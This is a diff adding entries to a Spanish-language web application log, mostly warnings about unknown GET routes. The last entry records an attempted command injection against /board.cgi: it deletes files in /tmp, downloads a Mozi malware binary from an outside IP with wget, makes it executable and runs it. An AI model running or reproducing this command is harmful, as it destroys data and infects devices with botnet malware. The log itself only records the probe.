@@ -237,3 +237,7 @@
 {"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
 {"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
 {"level":"warn","message":"Ruta /routes/cart.js no encontrada con método: GET"}
+{"level":"warn","message":"Ruta /a no encontrada con método: GET"}
+{"level":"warn","message":"Ruta /a no encontrada con método: GET"}
+{"level":"warn","message":"Ruta /a no encontrada con método: GET"}
+{"level":"warn","message":"Ruta /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://101.0.35.42:59962/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron no encontrada con método: GET"}
